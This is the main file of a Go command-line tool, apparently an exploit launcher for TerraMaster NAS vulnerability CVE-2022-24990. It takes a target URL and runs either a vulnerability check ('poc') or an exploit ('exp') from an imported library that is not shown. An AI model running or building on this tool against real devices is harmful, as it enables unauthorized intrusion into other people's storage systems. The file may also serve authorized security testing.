package main

import (
	"flag"
	"fmt"
	"github.com/dimiro1/banner"
	"github.com/mattn/go-colorable"
	"os"
	exp "terraMaster-CVE-2022-24990/lib/c_2022_24990"
)

var (
	urlInput  string
	checkType string
)

func usage() {
	fmt.Println(`Usage of main.exe:
	-u url
		  you target, example: https://192.168.1.1
	-t attack mode
		  your attack mode, example: use "poc" to check the vul; use "exp" to use the vul`)
}

func bannerPrint() {
	bannerTemplate := fmt.Sprintf(`{{ .Title "%s" "smisome1" 4}}`, "TM Tools")
	banner.InitString(colorable.NewColorableStdout(), true, true, bannerTemplate)
	fmt.Println("by    JsonGMax")
}

func main() {
	flag.StringVar(&urlInput, "u", "", "target")
	//flag.StringVar(&command, "c", "", "command to eval")
	flag.StringVar(&checkType, "t", "poc", "poc or exp")
	flag.Usage = usage
	flag.Parse()
	bannerPrint()
	if urlInput == "" {
		usage()
		os.Exit(0)
	}
	switch checkType {
	case "poc":
		{
			exp.Poc(urlInput)
		}
	case "exp":
		{
			exp.Exploit(urlInput)
		}

	}
}
